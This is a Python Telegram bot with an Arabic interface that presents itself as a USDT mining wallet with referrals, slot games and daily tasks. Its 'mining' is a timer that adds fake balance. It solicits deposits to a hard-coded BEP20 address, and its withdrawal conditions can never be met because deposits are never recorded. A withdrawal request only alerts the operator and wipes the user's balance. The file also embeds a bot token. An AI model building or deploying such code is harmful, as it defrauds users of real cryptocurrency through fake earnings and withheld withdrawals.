import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import json
import time
import random
from datetime import datetime, timedelta

# 🔐 التوكن والمعلومات
BOT_TOKEN = "8385331860:AAEs9uHNcuhYRHsO3Q3wC2DBhNp-znFc1H"
BOT_USERNAME = "BNBMini1Bot"
SUPPORT_USER_ID = "8400225549"  # سيستخدم لإرسال الإشعارات فقط
DEPOSIT_ADDRESS = "0xfc712c9985507a2eb44df1ddfe7f09ff7613a19b"

bot = telebot.TeleBot(BOT_TOKEN)

# 📊 تخزين البيانات
user_data = {}
support_tickets = {}

# 🎯 إنشاء لوحات المفاتيح
def main_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    buttons = [
        KeyboardButton("🏠 الرئيسية"),
        KeyboardButton("👥 الإحالات"),
        KeyboardButton("💰 المحفظة"),
        KeyboardButton("🎮 الألعاب"),
        KeyboardButton("📋 المهام"),
        KeyboardButton("📞 الدعم")
    ]
    keyboard.add(*buttons)
    return keyboard

def referrals_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📋 نسخ رابط الدعوة", callback_data="copy_referral"),
        InlineKeyboardButton("👥 إحالاتي", callback_data="my_referrals"),
        InlineKeyboardButton("💰 أرباح الإحالات", callback_data="referral_earnings")
    )
    return keyboard

def wallet_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("💳 الإيداع", callback_data="deposit"),
        InlineKeyboardButton("🔄 السحب", callback_data="withdraw"),
        InlineKeyboardButton("📋 نسخ عنوان الإيداع", callback_data="copy_deposit")
    )
    return keyboard

def games_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🎰 لعبة السلوت", callback_data="slot_game"),
        InlineKeyboardButton("🎯 محاولاتي", callback_data="my_attempts")
    )
    return keyboard

def tasks_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📅 المهام اليومية", callback_data="daily_tasks"),
        InlineKeyboardButton("🔥 تسجيل متتالي", callback_data="login_streak")
    )
    return keyboard

def support_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📩 إرسال رسالة للدعم", callback_data="send_support_msg"))
    return keyboard

# 📊 تهيئة بيانات المستخدم
def init_user_data(user_id):
    if str(user_id) not in user_data:
        user_data[str(user_id)] = {
            'wallet_balance': 0.00,
            'mining_earnings': 0.00,
            'referrals_count': 0,
            'completed_tasks': 0,
            'mining_progress': 0.00,
            'max_mining': 2.00,
            'attempts_left': 10,
            'consecutive_days': 1,
            'last_login': datetime.now().date().isoformat(),
            'total_games_played': 0,
            'referral_earnings': 0.00,
            'today_referrals': 0,
            'user_code': str(random.randint(10000000, 99999999)),
            'total_deposited': 0.00,
            'username': '',
            'first_name': ''
        }

# 🔔 إرسال إشعار للمسؤول (بدون كشف الهوية)
def send_support_notification(message_text, user_id):
    try:
        user_info = user_data.get(str(user_id), {})
        notification = f"""
📩 **رسالة دعم جديدة**

👤 **رمز المستخدم:** {user_info.get('user_code', 'غير معروف')}
🆔 **ID:** `{user_id}`
📅 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

💬 **الرسالة:**
{message_text}
        """.strip()
        
        bot.send_message(SUPPORT_USER_ID, notification, parse_mode='Markdown')
        return True
    except Exception as e:
        print(f"Error sending notification: {e}")
        return False

# 🎫 نظام التذاكر الداخلي
def create_support_ticket(user_id, message):
    ticket_id = f"TICKET_{user_id}_{int(time.time())}"
    support_tickets[ticket_id] = {
        'user_id': user_id,
        'message': message,
        'timestamp': datetime.now().isoformat(),
        'status': 'open',
        'user_code': user_data[str(user_id)]['user_code']
    }
    return ticket_id

# 🏁 أمر البدء
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    init_user_data(user_id)
    
    # حفظ معلومات المستخدم
    user_data[str(user_id)]['username'] = message.from_user.username or ''
    user_data[str(user_id)]['first_name'] = message.from_user.first_name or ''
    
    # التحقق من رابط الإحالة
    if len(message.text.split()) > 1:
        referral_code = message.text.split()[1]
        # معالجة الإحالة هنا
        if referral_code.isdigit() and len(referral_code) == 8:
            user_data[str(user_id)]['referred_by'] = referral_code
            # مكافأة المُحيل
            for uid, data in user_data.items():
                if data['user_code'] == referral_code:
                    data['referrals_count'] += 1
                    data['today_referrals'] += 1
                    data['referral_earnings'] += 1.00
                    break
    
    welcome_message = f"""🎉 أهلاً بك في محفظة تعدين USDT!

💰 رصيدك: {user_data[str(user_id)]['wallet_balance']:.2f} USDT
⛏️ جاري التعدين: {user_data[str(user_id)]['mining_progress']:.2f}/{user_data[str(user_id)]['max_mining']:.2f} USDT
👥 الإحالات: {user_data[str(user_id)]['referrals_count']}

🎯 ابدأ رحلتك نحو الأرباح اليومية من خلال:
• التعدين التلقائي
• نظام الإحالات المربح  
• الألعاب بمكافآت USDT
• المهام اليومية

اختر أحد الأوامر من الأسفل لبدء الاستخدام! 🚀"""
    
    bot.send_message(user_id, welcome_message, reply_markup=main_keyboard())
    
    # بدء التعدين التلقائي
    start_mining(user_id)

# 🔄 التعدين التلقائي
def start_mining(user_id):
    def mining_process():
        while True:
            time.sleep(30)  # كل 30 ثانية
            data = user_data.get(str(user_id))
            if data and data['mining_progress'] < data['max_mining']:
                data['mining_progress'] += 0.01
                if data['mining_progress'] > data['max_mining']:
                    data['mining_progress'] = data['max_mining']
                
                # إذا اكتمل التعدين اليومي
                if data['mining_progress'] >= data['max_mining']:
                    data['mining_earnings'] += data['max_mining']
                    data['mining_progress'] = 0.00
                    bot.send_message(user_id, f"🎉 اكتمل التعدين اليومي! تم إضافة {data['max_mining']:.2f} USDT إلى رصيدك")
    
    import threading
    thread = threading.Thread(target=mining_process)
    thread.daemon = True
    thread.start()

# 📨 معالجة الرسائل النصية
@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    user_id = message.from_user.id
    init_user_data(user_id)
    
    if message.text == "🏠 الرئيسية":
        show_main_dashboard(message)
    elif message.text == "👥 الإحالات":
        show_referrals(message)
    elif message.text == "💰 المحفظة":
        show_wallet(message)
    elif message.text == "🎮 الألعاب":
        show_games(message)
    elif message.text == "📋 المهام":
        show_tasks(message)
    elif message.text == "📞 الدعم":
        show_support(message)
    else:
        # إذا كانت رسالة نصية عادية، تعامل معها كرسالة دعم
        handle_support_message(message)

# 🏠 العرض الرئيسي
def show_main_dashboard(message):
    user_id = message.from_user.id
    data = user_data[str(user_id)]
    
    dashboard = f"""🏠 **الرئيسية**

💰 **المحفظة**
• الرصيد: {data['wallet_balance']:.2f} USDT
• أرباح التعدين: {data['mining_earnings']:.2f} USDT
• أرباح الإحالات: {data['referral_earnings']:.2f} USDT

⛏️ **التعدين**
• التقدم: {data['mining_progress']:.2f}/{data['max_mining']:.2f} USDT
• الحالة: {'🟢 جاري التعدين' if data['mining_progress'] < data['max_mining'] else '✅ مكتمل'}

📊 **الإحصائيات**
• الإحالات: {data['referrals_count']}
• المهام المكتملة: {data['completed_tasks']}/5
• المحاولات المتبقية: {data['attempts_left']}"""
    
    bot.send_message(user_id, dashboard, reply_markup=main_keyboard())

# 👥 قسم الإحالات
def show_referrals(message):
    user_id = message.from_user.id
    data = user_data[str(user_id)]
    
    referrals_msg = f"""👥 **نظام الإحالات**

🎯 كود الإحالة الخاص بك: `{data['user_code']}`
👥 عدد الإحالات: {data['referrals_count']}
📊 إحالات اليوم: {data['today_referrals']}
💰 أرباح الإحالات: {data['referral_earnings']:.2f} USDT

🎁 **المكافآت:**
• 1 USDT لكل إحالة جديدة
• 5 USDT مكافأة إضافية لكل 5 إحالات

**رابط الدعوة:**
`https://t.me/{BOT_USERNAME}?start={data['user_code']}`"""
    
    bot.send_message(user_id, referrals_msg, reply_markup=referrals_keyboard())

# 💰 قسم المحفظة
def show_wallet(message):
    user_id = message.from_user.id
    data = user_data[str(user_id)]
    total_balance = data['wallet_balance'] + data['mining_earnings'] + data['referral_earnings']
    
    wallet_msg = f"""💰 **المحفظة**

💳 **الإيداع**
• العنوان: `{DEPOSIT_ADDRESS}`
• الشبكة: BEP20 فقط

🔄 **السحب**
• الرصيد المتاح: {total_balance:.2f} USDT
• الحد الأدنى: 100.00 USDT

📋 **متطلبات السحب:**
{'✅' if data['consecutive_days'] >= 7 else '❌'} 7 أيام تسجيل متتالي
{'✅' if data['total_deposited'] >= 10 else '❌'} إيداع 10 USDT  
{'✅' if data['completed_tasks'] >= 5 else '❌'} إكمال 5 مهام
{'✅' if data['referrals_count'] >= 3 else '❌'} 3 إحالات على الأقل"""
    
    bot.send_message(user_id, wallet_msg, reply_markup=wallet_keyboard())

# 🎮 قسم الألعاب
def show_games(message):
    user_id = message.from_user.id
    data = user_data[str(user_id)]
    
    games_msg = f"""🎮 **الألعاب**

🎰 **لعبة السلوت**
• المحاولات المتاحة: {data['attempts_left']}
• الجولات الملعوبة: {data['total_games_played']}

🎁 **المكافآت:**
• 3 رموز متطابقة: 1.00 USDT
• رمزين متطابقين: 0.25 USDT

💡 كل إحالة = +2 محاولات جديدة"""
    
    bot.send_message(user_id, games_msg, reply_markup=games_keyboard())

# 📋 قسم المهام
def show_tasks(message):
    user_id = message.from_user.id
    data = user_data[str(user_id)]
    
    tasks_msg = f"""📋 **المهام اليومية**

🔥 تسجيل متتالي: {data['consecutive_days']}/7 أيام

✅ **المهام المتاحة:**
• تسجيل الدخول اليومي - 0.10 USDT
• اكتمال التعدين اليومي - 0.20 USDT  
• لعب 3 جولات - 0.15 USDT
• دعوة صديق - 1.00 USDT
• 7 أيام متتالية - 5.00 USDT

📊 التقدم: {data['completed_tasks']}/5 مهام مكتملة"""
    
    bot.send_message(user_id, tasks_msg, reply_markup=tasks_keyboard())

# 📞 قسم الدعم (مخفي الهوية)
def show_support(message):
    support_msg = """📞 **الدعم الفني**

💬 نحن هنا لمساعدتك! 
⏰ وقت الاستجابة: 24 ساعة كحد أقصى

📝 **كيفية التواصل:**
1. اكتب رسالتك مباشرة في هذه الدردشة
2. سيتم إرسالها إلى فريق الدعم
3. سنرد عليك في أقرب وقت

💡 **نصيحة:** كن واضحاً في وصف مشكلتك"""
    
    bot.send_message(message.from_user.id, support_msg, reply_markup=support_keyboard())

# 📩 معالجة رسائل الدعم
def handle_support_message(message):
    user_id = message.from_user.id
    user_message = message.text
    
    if len(user_message.strip()) < 5:
        bot.send_message(user_id, "⚠️ الرسالة قصيرة جداً. يرجى كتابة تفاصيل أكثر.")
        return
    
    # إنشاء تذكرة دعم
    ticket_id = create_support_ticket(user_id, user_message)
    
    # إرسال إشعار للمسؤول (بدون كشف هوية المستخدم)
    notification_sent = send_support_notification(user_message, user_id)
    
    if notification_sent:
        bot.send_message(user_id, "✅ تم إرسال رسالتك إلى فريق الدعم بنجاح!\n\nسنرد عليك في خلال 24 ساعة.")
    else:
        bot.send_message(user_id, "⚠️ حدث خطأ في إرسال الرسالة. يرجى المحاولة مرة أخرى.")

# 🎰 معالجة الردود على الأزرار
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    init_user_data(str(user_id))
    
    if call.data == "copy_referral":
        referral_link = f"https://t.me/{BOT_USERNAME}?start={user_data[str(user_id)]['user_code']}"
        bot.answer_callback_query(call.id, f"تم نسخ رابط الدعوة: {referral_link}", show_alert=True)
    
    elif call.data == "copy_deposit":
        bot.answer_callback_query(call.id, f"تم نسخ عنوان الإيداع: {DEPOSIT_ADDRESS}", show_alert=True)
    
    elif call.data == "slot_game":
        play_slot_game(call)
    
    elif call.data == "withdraw":
        handle_withdrawal(call)
    
    elif call.data == "send_support_msg":
        bot.send_message(user_id, "💬 اكتب رسالتك الآن وسيتم إرسالها إلى فريق الدupport:")

# 🎮 لعبة السلوت
def play_slot_game(call):
    user_id = call.from_user.id
    data = user_data[str(user_id)]
    
    if data['attempts_left'] <= 0:
        bot.answer_callback_query(call.id, "انتهت المحاولات! ادعُ أصدقاء للحصول على المزيد", show_alert=True)
        return
    
    # خفض المحاولات
    data['attempts_left'] -= 1
    data['total_games_played'] += 1
    
    # محاكاة اللعبة
    symbols = ['🍒', '🍋', '🍊', '⭐', '🔔', '7️⃣']
    result = [random.choice(symbols) for _ in range(3)]
    
    # حساب الجائزة
    prize = 0
    if result[0] == result[1] == result[2]:
        prize = 1.00
        win_msg = "🎉 فوز كبير!"
    elif result[0] == result[1] or result[1] == result[2] or result[0] == result[2]:
        prize = 0.25
        win_msg = "🎊 فوز!"
    else:
        win_msg = "💔 حظ أوفر في المرة القادمة!"
    
    if prize > 0:
        data['mining_earnings'] += prize
    
    game_result = f"""🎰 **نتيجة اللعبة**

{' | '.join(result)}

{win_msg}
{'💰 ربحت: ' + str(prize) + ' USDT' if prize > 0 else ''}

المحاولات المتبقية: {data['attempts_left']}"""
    
    bot.edit_message_text(
        game_result,
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=games_keyboard()
    )

# 💳 معالجة السحب
def handle_withdrawal(call):
    user_id = call.from_user.id
    data = user_data[str(user_id)]
    
    # التحقق من الشروط
    conditions = []
    if data['consecutive_days'] < 7:
        conditions.append("7 أيام تسجيل متتالي")
    if data['total_deposited'] < 10:
        conditions.append("إيداع 10 USDT أولاً")
    
    total_balance = data['wallet_balance'] + data['mining_earnings'] + data['referral_earnings']
    if total_balance < 100:
        conditions.append("الحد الأدنى للسحب 100 USDT")
    
    if conditions:
        bot.answer_callback_query(call.id, f"متطلبات غير مكتملة:\n" + "\n".join(conditions), show_alert=True)
        return
    
    # إذا استوفى جميع الشروط
    bot.send_message(user_id, "💳 **طلب السحب**\n\nأدخل عنوان محفظتك USDT (BEP20):")
    bot.register_next_step_handler(call.message, process_withdrawal_address, total_balance)

def process_withdrawal_address(message, amount):
    user_id = message.from_user.id
    wallet_address = message.text.strip()
    
    if len(wallet_address) < 10:  # تحقق بسيط
        bot.send_message(user_id, "⚠️ عنوان المحفظة غير صحيح. يرجى المحاولة مرة أخرى.")
        return
    
    # إرسال طلب السحب للمسؤول
    withdrawal_notification = f"""
🔄 **طلب سحب جديد**

👤 رمز المستخدم: {user_data[str(user_id)]['user_code']}
💳 العنوان: `{wallet_address}`
💰 المبلغ: {amount:.2f} USDT
📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """.strip()
    
    try:
        bot.send_message(SUPPORT_USER_ID, withdrawal_notification, parse_mode='Markdown')
        bot.send_message(user_id, f"✅ تم إرسال طلب السحب بقيمة {amount:.2f} USDT\n\nسيتم المعالجة خلال 24 ساعة.")
        
        # reset الرصيد
        user_data[str(user_id)]['wallet_balance'] = 0
        user_data[str(user_id)]['mining_earnings'] = 0
        user_data[str(user_id)]['referral_earnings'] = 0
        
    except Exception as e:
        bot.send_message(user_id, "❌ حدث خطأ في إرسال طلب السحب. يرجى المحاولة لاحقاً.")

# 🎯 تشغيل البوت
if __name__ == "__main__":
    print("🤖 البوت يعمل بنجاح...")
    print(f"📊 اسم البوت: @{BOT_USERNAME}")
    print("🚀 جاهز لاستقبال الرسائل!")
    bot.polling(none_stop=True)
